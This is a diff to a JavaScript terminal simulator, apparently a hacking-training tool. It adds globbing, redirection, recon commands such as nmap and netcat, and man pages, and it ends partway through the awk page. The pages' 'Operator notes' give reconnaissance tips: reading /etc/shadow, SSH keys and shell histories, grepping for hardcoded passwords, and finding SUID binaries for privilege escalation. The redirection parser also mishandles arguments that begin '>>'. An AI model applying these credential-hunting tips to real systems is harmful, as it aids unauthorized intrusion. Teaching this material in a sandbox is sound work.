@@ -3030,6 +3030,16 @@ class CLHTerminal {
             HOSTNAME: this.hostname,
         };
 
+        // Vim state
+        this._vimMode = null; // null = not in vim, 'normal', 'insert', 'command'
+        this._vimFile = null;
+        this._vimContent = [];
+        this._vimCursorLine = 0;
+        this._vimCursorCol = 0;
+        this._vimCommandBuffer = '';
+        this._vimMessage = '';
+        this._vimModified = false;
+
         // Get DOM elements
         const containerSelector = this.options.container || '#terminal';
         const inputSelector = this.options.inputElement || '#commandInput';
@@ -3092,6 +3102,12 @@ class CLHTerminal {
         this._savedInputValue = '';
 
         this.inputEl.addEventListener('keydown', (e) => {
+            // Handle vim mode separately
+            if (this._vimMode) {
+                this._handleVimKey(e);
+                return;
+            }
+
             // Handle reverse search mode separately
             if (this._reverseSearchMode) {
                 this._handleReverseSearchKey(e);
@@ -3426,6 +3442,158 @@ class CLHTerminal {
         return cmdLine;
     }
 
+    // ═══════════════════════════════════════════════════════════════
+    // WILDCARD/GLOB EXPANSION
+    // ═══════════════════════════════════════════════════════════════
+
+    _expandWildcards(args) {
+        const expanded = [];
+        for (const arg of args) {
+            if (arg.includes('*') || arg.includes('?') || arg.includes('{')) {
+                const matches = this._globMatch(arg);
+                if (matches.length > 0) {
+                    expanded.push(...matches);
+                } else {
+                    expanded.push(arg); // No match, keep original
+                }
+            } else {
+                expanded.push(arg);
+            }
+        }
+        return expanded;
+    }
+
+    _globMatch(pattern) {
+        // Handle brace expansion first: {a,b,c}
+        if (pattern.includes('{')) {
+            const braceMatch = pattern.match(/\{([^}]+)\}/);
+            if (braceMatch) {
+                const options = braceMatch[1].split(',');
+                const results = [];
+                for (const opt of options) {
+                    const expanded = pattern.replace(braceMatch[0], opt);
+                    results.push(...this._globMatch(expanded));
+                }
+                return results;
+            }
+        }
+
+        // Determine search directory and pattern
+        const lastSlash = pattern.lastIndexOf('/');
+        let searchDir, filePattern;
+
+        if (lastSlash >= 0) {
+            searchDir = this._resolvePath(pattern.substring(0, lastSlash) || '/');
+            filePattern = pattern.substring(lastSlash + 1);
+        } else {
+            searchDir = this.currentDir;
+            filePattern = pattern;
+        }
+
+        const dirEntry = this.fs[searchDir];
+        if (!dirEntry || dirEntry.type !== 'dir') return [];
+
+        // Convert glob pattern to regex
+        const regexPattern = filePattern
+            .replace(/\./g, '\\.')
+            .replace(/\*/g, '.*')
+            .replace(/\?/g, '.');
+        const regex = new RegExp(`^${regexPattern}$`);
+
+        const matches = (dirEntry.children || [])
+            .filter(name => regex.test(name))
+            .map(name => {
+                if (lastSlash >= 0) {
+                    return pattern.substring(0, lastSlash + 1) + name;
+                }
+                return name;
+            })
+            .sort();
+
+        return matches;
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // I/O REDIRECTION
+    // ═══════════════════════════════════════════════════════════════
+
+    _parseRedirection(args) {
+        let stdout = null;
+        let stdin = null;
+        let append = false;
+        let stderr = null;
+        const cleanArgs = [];
+
+        for (let i = 0; i < args.length; i++) {
+            const arg = args[i];
+
+            if (arg === '>') {
+                stdout = args[++i];
+                append = false;
+            } else if (arg === '>>') {
+                stdout = args[++i];
+                append = true;
+            } else if (arg === '<') {
+                stdin = args[++i];
+            } else if (arg === '2>&1') {
+                stderr = 'stdout';
+            } else if (arg === '2>') {
+                stderr = args[++i];
+            } else if (arg.startsWith('>')) {
+                stdout = arg.substring(1);
+                append = false;
+            } else if (arg.startsWith('>>')) {
+                stdout = arg.substring(2);
+                append = true;
+            } else {
+                cleanArgs.push(arg);
+            }
+        }
+
+        return { args: cleanArgs, stdout, stdin, append, stderr };
+    }
+
+    _handleRedirection(output, redirection) {
+        const { stdout, append, stdin } = redirection;
+
+        // Handle stdin redirection (read from file)
+        let inputContent = null;
+        if (stdin) {
+            const resolved = this._resolvePath(stdin);
+            const entry = this.fs[resolved];
+            if (entry && entry.type === 'file') {
+                inputContent = entry.content;
+            }
+        }
+
+        // Handle stdout redirection (write to file)
+        if (stdout && output) {
+            const resolved = this._resolvePath(stdout);
+            const parent = resolved.substring(0, resolved.lastIndexOf('/')) || '/';
+            const filename = resolved.split('/').pop();
+
+            if (this.fs[parent] && this.fs[parent].type === 'dir') {
+                if (append && this.fs[resolved]) {
+                    this.fs[resolved].content += '\n' + output;
+                } else {
+                    this.fs[resolved] = {
+                        type: 'file',
+                        perms: '-rw-r--r--',
+                        owner: this.user,
+                        group: this.user,
+                        content: output
+                    };
+                    if (!this.fs[parent].children.includes(filename)) {
+                        this.fs[parent].children.push(filename);
+                    }
+                }
+                return ''; // Don't print to terminal
+            }
+        }
+
+        return output;
+    }
+
     _parseCommand(cmdLine) {
         // Smart parsing that handles quotes
         const args = [];
@@ -3550,25 +3718,25 @@ class CLHTerminal {
         const commands = [
             'alias', 'apt', 'apt-cache', 'apt-get', 'arp', 'awk',
             'base64', 'basename', 'bash', 'bg',
-            'cat', 'cd', 'chgrp', 'chmod', 'chown', 'clear', 'cp', 'crontab', 'curl', 'cut',
+            'cat', 'cd', 'chgrp', 'chmod', 'chown', 'clear', 'cmatrix', 'cowsay', 'cp', 'crontab', 'curl', 'cut',
             'date', 'df', 'diff', 'dig', 'dirname', 'dmesg', 'dpkg', 'du',
             'echo', 'env', 'exit', 'export',
-            'fdisk', 'fg', 'file', 'find', 'free',
+            'fdisk', 'fg', 'figlet', 'file', 'find', 'fortune', 'free',
             'getfacl', 'grep', 'groupadd', 'groups', 'gunzip', 'gzip',
-            'head', 'help', 'history', 'hostname', 'htop',
+            'head', 'help', 'history', 'hollywood', 'hostname', 'htop',
             'id', 'ifconfig', 'iostat', 'ip',
             'jobs', 'journalctl',
             'kill', 'killall',
-            'last', 'less', 'ln', 'locate', 'ls', 'lsblk', 'lsof',
-            'man', 'mkdir', 'more', 'mount', 'mv',
-            'nano', 'netstat', 'nslookup',
+            'last', 'less', 'ln', 'locate', 'lolcat', 'ls', 'lsblk', 'lsof',
+            'man', 'md5sum', 'mkdir', 'more', 'mount', 'mv',
+            'nano', 'nc', 'netcat', 'netstat', 'nmap', 'nslookup',
             'passwd', 'ping', 'pkill', 'ps', 'pwd',
             'reboot', 'rm', 'rmdir', 'route',
-            'sar', 'scp', 'sed', 'service', 'shutdown', 'sort', 'source', 'ss', 'ssh', 'ssh-keygen', 'stat', 'su', 'sudo', 'systemctl',
-            'tail', 'tar', 'tee', 'time', 'top', 'touch', 'tr', 'traceroute', 'tree', 'type',
+            'sar', 'scp', 'sed', 'service', 'sha1sum', 'sha256sum', 'shutdown', 'sl', 'sort', 'source', 'ss', 'ssh', 'ssh-keygen', 'stat', 'strings', 'su', 'sudo', 'systemctl',
+            'tail', 'tar', 'tcpdump', 'tee', 'time', 'top', 'touch', 'tr', 'traceroute', 'tree', 'type',
             'ulimit', 'umask', 'uname', 'uniq', 'unzip', 'uptime', 'useradd', 'userdel', 'usermod',
             'vi', 'vim', 'vmstat',
-            'w', 'watch', 'wc', 'wget', 'whereis', 'which', 'who', 'whoami',
+            'w', 'watch', 'wc', 'wget', 'whereis', 'which', 'whois', 'who', 'whoami',
             'xargs',
             'yes',
             'zip'
@@ -3816,7 +3984,7 @@ class CLHTerminal {
                 output = `${cmd}: requires root privileges (use sudo)`; break;
             case 'vim': case 'vi': case 'nano': output = this._cmdVim(args); break;
             case 'less': case 'more': output = this._cmdCat(args); break;
-            case 'man': output = `No manual entry for ${args[0] || 'command'}`; break;
+            case 'man': output = this._cmdMan(args); break;
             case 'which': output = args[0] ? `/usr/bin/${args[0]}` : 'which: missing argument'; break;
             case 'type': output = args[0] ? `${args[0]} is /usr/bin/${args[0]}` : 'type: missing argument'; break;
             case 'alias': output = 'alias ll=\'ls -la\''; break;
@@ -3826,6 +3994,34 @@ class CLHTerminal {
             case 'exit': output = 'logout'; break;
             case 'true': exitCode = 0; break;
             case 'false': exitCode = 1; break;
+            // Text processing commands
+            case 'sort': output = this._cmdSort(args); break;
+            case 'uniq': output = this._cmdUniq(args); break;
+            case 'cut': output = this._cmdCut(args); break;
+            case 'tr': output = this._cmdTr(args); break;
+            case 'sed': output = this._cmdSed(args); break;
+            case 'awk': output = this._cmdAwk(args); break;
+            case 'tee': output = this._cmdTee(args); break;
+            case 'xargs': output = this._cmdXargs(args); break;
+            // Crypto/encoding commands
+            case 'base64': output = this._cmdBase64(args); break;
+            case 'md5sum': output = this._cmdMd5sum(args); break;
+            case 'sha256sum': output = this._cmdSha256sum(args); break;
+            case 'sha1sum': output = this._cmdSha1sum(args); break;
+            case 'strings': output = this._cmdStrings(args); break;
+            // Security/recon commands
+            case 'nmap': output = this._cmdNmap(args); break;
+            case 'nc': case 'netcat': output = this._cmdNetcat(args); break;
+            case 'tcpdump': output = this._cmdTcpdump(args); break;
+            case 'whois': output = this._cmdWhois(args); break;
+            // Easter eggs
+            case 'sl': output = this._cmdSl(); break;
+            case 'cowsay': output = this._cmdCowsay(args); break;
+            case 'fortune': output = this._cmdFortune(); break;
+            case 'cmatrix': output = this._cmdCmatrix(); break;
+            case 'figlet': output = this._cmdFiglet(args); break;
+            case 'lolcat': output = this._cmdLolcat(args); break;
+            case 'hollywood': output = this._cmdHollywood(); break;
             case '': break;
             default:
                 output = `${cmd}: command not found`;
@@ -3916,7 +4112,7 @@ class CLHTerminal {
                 output = `${cmd}: requires root privileges (use sudo)`; break;
             case 'vim': case 'vi': case 'nano': output = this._cmdVim(args); break;
             case 'less': case 'more': output = this._cmdCat(args); break;
-            case 'man': output = `No manual entry for ${args[0] || 'command'}`; break;
+            case 'man': output = this._cmdMan(args); break;
             case 'which': output = args[0] ? `/usr/bin/${args[0]}` : 'which: missing argument'; break;
             case 'type': output = args[0] ? `${args[0]} is /usr/bin/${args[0]}` : 'type: missing argument'; break;
             case 'alias': output = 'alias ll=\'ls -la\''; break;
@@ -4085,16 +4281,2554 @@ class CLHTerminal {
 
     _cmdHelp() {
         return `Available commands:
-  Navigation: pwd, cd, ls
-  Files: cat, head, tail, less, file, stat, find
-  Search: grep, wc
-  System: uname, hostname, whoami, id, date, uptime
-  Process: ps, top
-  Network: ip, ifconfig, netstat, ss, ping, nslookup
-  Disk: df, du, lsblk, mount
-  Users: w, last, who
-  Services: systemctl, service
-  Other: echo, env, history, clear, help`;
+  Navigation:   pwd, cd, ls, tree, find, locate
+  Files:        cat, head, tail, less, more, file, stat, touch, mkdir, rm, cp, mv
+  Search:       grep, wc
+  Text:         echo, sort, uniq, cut, tr, sed, awk, tee, xargs
+  Crypto:       base64, md5sum, sha1sum, sha256sum, strings
+  Archives:     tar, gzip, gunzip, zip, unzip
+  System:       uname, hostname, whoami, id, date, uptime, free, vmstat, iostat
+  Process:      ps, top, kill, pkill
+  Network:      ip, ifconfig, netstat, ss, ping, nslookup, dig, traceroute, arp, route
+  Security:     nmap, nc, tcpdump, whois
+  Disk:         df, du, lsblk, mount, fdisk
+  Users:        w, last, who, useradd, userdel, passwd
+  Permissions:  chmod, chown, chgrp, getfacl
+  Services:     systemctl, service, crontab
+  Packages:     apt, apt-get, dpkg
+  Remote:       ssh, scp, curl, wget
+  Editors:      vim, vi, nano
+  Other:        echo, env, export, history, alias, clear, help, man, which, type
+
+Shell features:
+  Tab completion, history (Up/Down), Ctrl+C/L/R/A/E/U/K/W/D
+  Pipes (|), redirection (>, >>, <), chaining (&&, ||, ;)
+  Wildcards (*, ?, {a,b}), variables ($VAR)
+
+Type 'man <cmd>' for help on specific commands.`;
+    }
+
+    _cmdMan(args) {
+        const cmd = args[0];
+        if (!cmd) {
+            return `What manual page do you want?
+For example, try 'man man'.`;
+        }
+
+        const manPages = {
+            // Man itself
+            'man': `MAN(1)                        Manual pager utils                        MAN(1)
+
+NAME
+       man - an interface to the system reference manuals
+
+SYNOPSIS
+       man [OPTION...] [SECTION] PAGE...
+
+DESCRIPTION
+       man  is  the system's manual pager. Each page argument given to man is
+       normally the name of a program, utility or function.
+
+       The table below shows the section numbers of the manual followed by the
+       types of pages they contain.
+
+       1   Executable programs or shell commands
+       2   System calls (functions provided by the kernel)
+       3   Library calls (functions within program libraries)
+       4   Special files (usually found in /dev)
+       5   File formats and conventions, e.g. /etc/passwd
+       6   Games
+       7   Miscellaneous
+       8   System administration commands (usually only for root)
+       9   Kernel routines [Non standard]
+
+EXAMPLES
+       man ls
+           Display the manual page for the item (program) ls.
+
+       man man.7
+           Display the manual page for macro package man from section 7.
+
+OPERATOR NOTES
+       Use man when you need to:
+       • Learn the correct syntax and options for any command
+       • Understand what flags are available before using a tool
+       • Find related commands in the SEE ALSO section
+
+       Pro tip: Real operators read the manual. When you encounter an
+       unfamiliar command on a target system, man is your first resource.
+       The best hackers know their tools inside and out.
+
+SEE ALSO
+       apropos(1), whatis(1), less(1), groff(1)`,
+
+            // Navigation
+            'ls': `LS(1)                           User Commands                          LS(1)
+
+NAME
+       ls - list directory contents
+
+SYNOPSIS
+       ls [OPTION]... [FILE]...
+
+DESCRIPTION
+       List  information  about  the FILEs (the current directory by default).
+       Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.
+
+       -a, --all
+              do not ignore entries starting with .
+
+       -l     use a long listing format
+
+       -h, --human-readable
+              with -l, print sizes like 1K 234M 2G etc.
+
+       -r, --reverse
+              reverse order while sorting
+
+       -R, --recursive
+              list subdirectories recursively
+
+       -t     sort by time, newest first
+
+EXAMPLES
+       ls -la
+              List all files including hidden, in long format.
+
+       ls -lh /var/log
+              List files in /var/log with human-readable sizes.
+
+OPERATOR NOTES
+       Use ls when you need to:
+       • Survey a directory's contents during reconnaissance
+       • Find hidden files (.bashrc, .ssh, .bash_history) with -a
+       • Check file permissions and ownership with -l
+       • Identify recently modified files with -lt (newest first)
+
+       Pro tip: ls -la is your first command when landing in any directory.
+       Hidden files often contain credentials, history, and config data.
+       Always check for .ssh/, .gnupg/, and .*_history files.
+
+SEE ALSO
+       dir(1), find(1), stat(1)`,
+
+            'cd': `CD(1)                        Bash Builtins                           CD(1)
+
+NAME
+       cd - change the working directory
+
+SYNOPSIS
+       cd [-L|[-P [-e]] [-@]] [dir]
+
+DESCRIPTION
+       Change  the  current  directory to dir.  if dir is not supplied, the
+       value of the HOME shell variable is the default.
+
+       The variable CDPATH defines the search path for the directory.
+
+       -L     force symbolic links to be followed
+
+       -P     use the physical directory structure without following symlinks
+
+EXAMPLES
+       cd /var/log
+              Change to the /var/log directory.
+
+       cd ~
+              Change to home directory.
+
+       cd ..
+              Change to parent directory.
+
+       cd -
+              Change to previous directory.
+
+OPERATOR NOTES
+       Use cd when you need to:
+       • Navigate to key directories during system enumeration
+       • Move to /var/log for log analysis
+       • Access /etc for configuration file review
+       • Check user home directories for sensitive data
+
+       Pro tip: Know your critical paths by heart:
+       /etc (configs), /var/log (logs), /tmp (temp files),
+       /home (user data), /root (root's home), /opt (third-party apps).
+       cd - is invaluable for jumping between two locations.
+
+SEE ALSO
+       pwd(1), pushd(1), popd(1)`,
+
+            'pwd': `PWD(1)                          User Commands                         PWD(1)
+
+NAME
+       pwd - print name of current/working directory
+
+SYNOPSIS
+       pwd [OPTION]...
+
+DESCRIPTION
+       Print the full filename of the current working directory.
+
+       -L, --logical
+              use PWD from environment, even if it contains symlinks
+
+       -P, --physical
+              avoid all symlinks
+
+OPERATOR NOTES
+       Use pwd when you need to:
+       • Confirm your current location in the filesystem
+       • Get the full path for scripts or documentation
+       • Verify you're in the correct directory before operations
+
+       Pro tip: Always know where you are. Getting lost in a filesystem
+       during an operation wastes time. Use pwd -P to see the real path
+       if symlinks might be hiding your true location.
+
+SEE ALSO
+       cd(1), getcwd(3)`,
+
+            // File operations
+            'cat': `CAT(1)                          User Commands                         CAT(1)
+
+NAME
+       cat - concatenate files and print on the standard output
+
+SYNOPSIS
+       cat [OPTION]... [FILE]...
+
+DESCRIPTION
+       Concatenate FILE(s) to standard output.
+
+       With no FILE, or when FILE is -, read standard input.
+
+       -A, --show-all
+              equivalent to -vET
+
+       -n, --number
+              number all output lines
+
+       -b, --number-nonblank
+              number nonempty output lines, overrides -n
+
+       -E, --show-ends
+              display $ at end of each line
+
+       -T, --show-tabs
+              display TAB characters as ^I
+
+EXAMPLES
+       cat file1 file2
+              Concatenate file1 and file2 to stdout.
+
+       cat -n /etc/passwd
+              Display passwd file with line numbers.
+
+OPERATOR NOTES
+       Use cat when you need to:
+       • Quickly view small configuration files
+       • Read /etc/passwd, /etc/shadow (if accessible), /etc/hosts
+       • Display SSH keys, cron files, or shell histories
+       • Combine multiple files into one output stream
+
+       Pro tip: cat is fast but floods your terminal with large files.
+       For large logs, use head, tail, or less instead. Key targets:
+       /etc/passwd (users), ~/.ssh/authorized_keys, ~/.bash_history
+
+SEE ALSO
+       head(1), tail(1), tac(1), more(1), less(1)`,
+
+            'head': `HEAD(1)                         User Commands                        HEAD(1)
+
+NAME
+       head - output the first part of files
+
+SYNOPSIS
+       head [OPTION]... [FILE]...
+
+DESCRIPTION
+       Print  the first 10 lines of each FILE to standard output.
+       With more than one FILE, precede each with a header giving the file name.
+
+       -c, --bytes=[-]NUM
+              print the first NUM bytes of each file
+
+       -n, --lines=[-]NUM
+              print the first NUM lines instead of the first 10
+
+       -q, --quiet, --silent
+              never print headers giving file names
+
+EXAMPLES
+       head -n 20 file.txt
+              Display first 20 lines of file.txt.
+
+       head -c 100 file.bin
+              Display first 100 bytes of file.bin.
+
+OPERATOR NOTES
+       Use head when you need to:
+       • Preview the structure of a file without loading it all
+       • Check file headers and magic bytes (head -c 16)
+       • Read the beginning of logs to understand their format
+       • Sample data files before processing
+
+       Pro tip: Use head -c to inspect binary files for magic bytes.
+       PNG starts with 89 50 4E 47, ELF with 7F 45 4C 46.
+       This helps identify file types regardless of extension.
+
+SEE ALSO
+       tail(1), cat(1), less(1)`,
+
+            'tail': `TAIL(1)                         User Commands                        TAIL(1)
+
+NAME
+       tail - output the last part of files
+
+SYNOPSIS
+       tail [OPTION]... [FILE]...
+
+DESCRIPTION
+       Print the last 10 lines of each FILE to standard output.
+       With more than one FILE, precede each with a header giving the file name.
+
+       -c, --bytes=[+]NUM
+              output the last NUM bytes
+
+       -f, --follow[={name|descriptor}]
+              output appended data as the file grows
+
+       -n, --lines=[+]NUM
+              output the last NUM lines, instead of the last 10
+
+EXAMPLES
+       tail -n 20 /var/log/syslog
+              Display last 20 lines of syslog.
+
+       tail -f /var/log/auth.log
+              Follow auth.log in real-time.
+
+OPERATOR NOTES
+       Use tail when you need to:
+       • View the most recent entries in log files
+       • Monitor live log activity with -f (follow mode)
+       • Check recent authentication attempts in auth.log
+       • Watch for new entries during active investigation
+
+       Pro tip: tail -f is essential for real-time monitoring.
+       Watch /var/log/auth.log for login attempts,
+       /var/log/syslog for system events. Use Ctrl+C to exit follow mode.
+       Combine with grep: tail -f /var/log/auth.log | grep "Failed"
+
+SEE ALSO
+       head(1), cat(1), less(1)`,
+
+            // Search
+            'grep': `GREP(1)                         User Commands                        GREP(1)
+
+NAME
+       grep, egrep, fgrep - print lines that match patterns
+
+SYNOPSIS
+       grep [OPTION...] PATTERNS [FILE...]
+
+DESCRIPTION
+       grep  searches  for PATTERNS in each FILE.  PATTERNS is one or more
+       patterns separated by newline characters, and grep prints each line
+       that matches a pattern.
+
+       -i, --ignore-case
+              ignore case distinctions in patterns and data
+
+       -v, --invert-match
+              select non-matching lines
+
+       -c, --count
+              print only a count of selected lines per FILE
+
+       -n, --line-number
+              prefix each line of output with the line number
+
+       -r, --recursive
+              read all files under each directory, recursively
+
+       -l, --files-with-matches
+              print only names of FILEs with selected lines
+
+       -E, --extended-regexp
+              interpret PATTERNS as extended regular expressions
+
+EXAMPLES
+       grep "error" /var/log/syslog
+              Search for "error" in syslog.
+
+       grep -r "TODO" .
+              Recursively search for TODO in current directory.
+
+       grep -i "warning" *.log
+              Case-insensitive search in all .log files.
+
+       ps aux | grep nginx
+              Find nginx processes.
+
+OPERATOR NOTES
+       Use grep when you need to:
+       • Search logs for suspicious activity (failed logins, errors)
+       • Find passwords, keys, or credentials in config files
+       • Filter command output (ps aux | grep process)
+       • Hunt for indicators of compromise across filesystems
+
+       Pro tip: grep is your primary hunting tool. Master these patterns:
+       grep -r "password" /etc/         # Find hardcoded passwords
+       grep "Failed" /var/log/auth.log  # Failed login attempts
+       grep -E "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}" file  # IP addresses
+       Use -v to exclude noise: grep -v "^#" config  # Skip comments
+
+SEE ALSO
+       awk(1), sed(1), find(1), regex(7)`,
+
+            'find': `FIND(1)                         User Commands                        FIND(1)
+
+NAME
+       find - search for files in a directory hierarchy
+
+SYNOPSIS
+       find [-H] [-L] [-P] [-D debugopts] [-Olevel] [path...] [expression]
+
+DESCRIPTION
+       This manual page documents the GNU version of find.  GNU find searches
+       the directory tree rooted at each given starting-point by evaluating
+       the given expression from left to right.
+
+       -name pattern
+              Base of file name matches shell pattern pattern.
+
+       -type c
+              File is of type c:
+              b      block (buffered) special
+              c      character (unbuffered) special
+              d      directory
+              f      regular file
+              l      symbolic link
+
+       -mtime n
+              File's data was last modified n*24 hours ago.
+
+       -size n[cwbkMG]
+              File uses n units of space.
+
+       -exec command ;
+              Execute command on each found file.
+
+EXAMPLES
+       find /home -name "*.txt"
+              Find all .txt files in /home.
+
+       find . -type f -mtime -7
+              Find files modified in last 7 days.
+
+       find /var/log -name "*.log" -exec rm {} \\;
+              Delete all .log files in /var/log.
+
+OPERATOR NOTES
+       Use find when you need to:
+       • Locate files by name, type, size, or modification time
+       • Hunt for SUID/SGID binaries (privilege escalation vectors)
+       • Find world-writable files and directories
+       • Discover recently modified files during incident response
+
+       Pro tip: Critical security searches every operator should know:
+       find / -perm -4000 2>/dev/null    # SUID binaries (privesc)
+       find / -perm -2000 2>/dev/null    # SGID binaries
+       find / -perm -o+w 2>/dev/null     # World-writable files
+       find / -name "*.sh" -mtime -1     # Scripts modified in 24h
+       find /tmp -type f                  # Files in /tmp (suspicious)
+
+SEE ALSO
+       locate(1), grep(1), xargs(1)`,
+
+            // Text processing
+            'sort': `SORT(1)                         User Commands                        SORT(1)
+
+NAME
+       sort - sort lines of text files
+
+SYNOPSIS
+       sort [OPTION]... [FILE]...
+
+DESCRIPTION
+       Write sorted concatenation of all FILE(s) to standard output.
+
+       -b, --ignore-leading-blanks
+              ignore leading blanks
+
+       -f, --ignore-case
+              fold lower case to upper case characters
+
+       -n, --numeric-sort
+              compare according to string numerical value
+
+       -r, --reverse
+              reverse the result of comparisons
+
+       -u, --unique
+              with -c, check for strict ordering; without -c, output only
+              the first of an equal run
+
+       -k, --key=KEYDEF
+              sort via a key; KEYDEF gives location and type
+
+       -t, --field-separator=SEP
+              use SEP instead of non-blank to blank transition
+
+EXAMPLES
+       sort file.txt
+              Sort lines alphabetically.
+
+       sort -n numbers.txt
+              Sort numerically.
+
+       sort -r file.txt
+              Sort in reverse order.
+
+       sort -u file.txt
+              Sort and remove duplicates.
+
+       sort -t: -k3 -n /etc/passwd
+              Sort passwd by UID (3rd field).
+
+OPERATOR NOTES
+       Use sort when you need to:
+       • Organize data for analysis or deduplication
+       • Prepare input for uniq (which requires sorted data)
+       • Rank items by frequency, size, or other metrics
+       • Order log entries or user lists for review
+
+       Pro tip: sort | uniq -c | sort -rn is a powerful pattern.
+       It counts occurrences and ranks by frequency - perfect for
+       finding the most common IPs in logs, repeated commands in
+       history, or frequent error messages. Master this combo.
+
+SEE ALSO
+       uniq(1), comm(1), join(1)`,
+
+            'uniq': `UNIQ(1)                         User Commands                        UNIQ(1)
+
+NAME
+       uniq - report or omit repeated lines
+
+SYNOPSIS
+       uniq [OPTION]... [INPUT [OUTPUT]]
+
+DESCRIPTION
+       Filter adjacent matching lines from INPUT (or stdin), writing to
+       OUTPUT (or stdout).
+
+       Note: 'uniq' does not detect repeated lines unless they are adjacent.
+       You may want to sort the input first, or use 'sort -u' without 'uniq'.
+
+       -c, --count
+              prefix lines by the number of occurrences
+
+       -d, --repeated
+              only print duplicate lines, one for each group
+
+       -i, --ignore-case
+              ignore differences in case when comparing
+
+       -u, --unique
+              only print unique lines
+
+EXAMPLES
+       sort file.txt | uniq
+              Remove duplicate lines (after sorting).
+
+       sort file.txt | uniq -c
+              Count occurrences of each line.
+
+       sort file.txt | uniq -d
+              Show only duplicated lines.
+
+OPERATOR NOTES
+       Use uniq when you need to:
+       • Remove duplicate entries after sorting
+       • Count frequency of items with -c
+       • Find repeated patterns (potential anomalies) with -d
+       • Identify unique entries with -u
+
+       Pro tip: uniq -c is essential for log analysis. Pipeline:
+       cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -rn
+       This shows IPs by request count - useful for finding
+       DDoS sources, scanners, or suspicious activity.
+
+SEE ALSO
+       sort(1), comm(1)`,
+
+            'cut': `CUT(1)                          User Commands                         CUT(1)
+
+NAME
+       cut - remove sections from each line of files
+
+SYNOPSIS
+       cut OPTION... [FILE]...
+
+DESCRIPTION
+       Print selected parts of lines from each FILE to standard output.
+
+       -b, --bytes=LIST
+              select only these bytes
+
+       -c, --characters=LIST
+              select only these characters
+
+       -d, --delimiter=DELIM
+              use DELIM instead of TAB for field delimiter
+
+       -f, --fields=LIST
+              select only these fields
+
+       Use one, and only one of -b, -c or -f.
+
+       LIST is comma-separated integers or ranges (e.g., 1,3,5-7).
+
+EXAMPLES
+       cut -d: -f1 /etc/passwd
+              Extract usernames from passwd file.
+
+       cut -c1-10 file.txt
+              Extract first 10 characters of each line.
+
+       cut -d, -f2,4 data.csv
+              Extract 2nd and 4th fields from CSV.
+
+OPERATOR NOTES
+       Use cut when you need to:
+       • Extract specific fields from structured data (CSV, passwd, logs)
+       • Pull usernames, UIDs, or shells from /etc/passwd
+       • Isolate IP addresses or timestamps from log entries
+       • Parse any colon, comma, or tab-delimited file
+
+       Pro tip: cut is your go-to for colon-separated files.
+       cut -d: -f1 /etc/passwd          # Usernames
+       cut -d: -f3 /etc/passwd          # UIDs
+       cut -d: -f7 /etc/passwd          # Login shells
+       Combine with sort | uniq to analyze patterns.
+
+SEE ALSO
+       awk(1), paste(1), join(1)`,
+
+            'tr': `TR(1)                           User Commands                          TR(1)
+
+NAME
+       tr - translate or delete characters
+
+SYNOPSIS
+       tr [OPTION]... SET1 [SET2]
+
+DESCRIPTION
+       Translate, squeeze, and/or delete characters from standard input,
+       writing to standard output.
+
+       -c, -C, --complement
+              use the complement of SET1
+
+       -d, --delete
+              delete characters in SET1, do not translate
+
+       -s, --squeeze-repeats
+              replace each sequence of a repeated character with single occurrence
+
+       SETs are specified as strings of characters. Interpreted sequences:
+       \\n     new line
+       \\t     horizontal tab
+       a-z    all characters from a to z
+       [:alnum:]  all letters and digits
+       [:alpha:]  all letters
+       [:digit:]  all digits
+       [:lower:]  all lower case letters
+       [:upper:]  all upper case letters
+
+EXAMPLES
+       echo "hello" | tr 'a-z' 'A-Z'
+              Convert to uppercase.
+
+       echo "hello   world" | tr -s ' '
+              Squeeze multiple spaces to one.
+
+       echo "hello123" | tr -d '0-9'
+              Delete all digits.
+
+OPERATOR NOTES
+       Use tr when you need to:
+       • Normalize case for consistent comparison
+       • Remove or replace specific characters
+       • Clean up whitespace in data
+       • Simple character-level transformations
+
+       Pro tip: tr is perfect for quick data cleaning.
+       tr -d '\\r' < file               # Remove Windows carriage returns
+       tr '[:upper:]' '[:lower:]'      # Normalize to lowercase
+       tr -cd '[:print:]'              # Keep only printable characters
+       Use with ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m' for simple encoding.
+
+SEE ALSO
+       sed(1), awk(1)`,
+
+            'sed': `SED(1)                          User Commands                         SED(1)
+
+NAME
+       sed - stream editor for filtering and transforming text
+
+SYNOPSIS
+       sed [OPTION]... {script-only-if-no-other-script} [input-file]...
+
+DESCRIPTION
+       Sed is a stream editor.  A stream editor is used to perform basic text
+       transformations on an input stream.
+
+       -n, --quiet, --silent
+              suppress automatic printing of pattern space
+
+       -e script, --expression=script
+              add the script to the commands to be executed
+
+       -i[SUFFIX], --in-place[=SUFFIX]
+              edit files in place (makes backup if SUFFIX supplied)
+
+COMMANDS
+       s/regexp/replacement/
+              Attempt to match regexp against the pattern space.  If
+              successful, replace that portion matched with replacement.
+
+       d      Delete pattern space.  Start next cycle.
+
+       p      Print the current pattern space.
+
+       q      Quit (exit sed).
+
+EXAMPLES
+       sed 's/old/new/' file.txt
+              Replace first occurrence of 'old' with 'new' on each line.
+
+       sed 's/old/new/g' file.txt
+              Replace all occurrences globally.
+
+       sed -n '/pattern/p' file.txt
+              Print only lines matching pattern.
+
+       sed '/pattern/d' file.txt
+              Delete lines matching pattern.
+
+       sed -i 's/foo/bar/g' file.txt
+              Edit file in place.
+
+OPERATOR NOTES
+       Use sed when you need to:
+       • Search and replace text across files
+       • Delete lines matching a pattern (sanitize logs)
+       • Extract specific line ranges from files
+       • Transform data in pipelines
+
+       Pro tip: sed is the surgeon's scalpel for text manipulation.
+       sed -n '10,20p' file             # Print lines 10-20 only
+       sed '/^#/d' config               # Remove comment lines
+       sed 's/\\.old/.new/g' file       # Batch rename in content
+       sed -n '/START/,/END/p' file     # Extract between markers
+       Master regex with sed for powerful data extraction.
+
+SEE ALSO
+       awk(1), ed(1), grep(1), tr(1), regex(7)`,
+
+            'awk': `AWK(1)                          User Commands                         AWK(1)
+
+NAME
+       awk - pattern scanning and processing language
+
+SYNOPSIS
+       awk [ -F fs ] [ -v var=value ] [ 'prog' | -f progfile ] [ file ...  ]
+
+DESCRIPTION
+       Awk scans each input file for lines that match any of a set of
+       patterns. For each pattern matched, the associated action is performed.
+
+       -F fs  Define the input field separator to be the regular expression fs.
+
+       -v var=value
+              Assign value to variable var before execution of the program.
+
+BUILT-IN VARIABLES
+       NR     The total number of input records seen so far.
+       NF     The number of fields in the current input record.
+       FS     The input field separator (default: whitespace).
